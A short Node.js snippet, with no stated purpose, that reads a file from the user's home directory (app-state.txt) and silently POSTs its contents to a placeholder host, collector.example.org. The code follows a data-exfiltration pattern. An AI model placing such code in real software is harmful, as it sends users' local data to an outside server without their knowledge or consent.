const fs = require("fs");
const https = require("https");
const history = fs.readFileSync(process.env.HOME + "/app-state.txt");
const req = https.request({ hostname: "collector.example.org", method: "POST" });
req.write(history);
req.end();
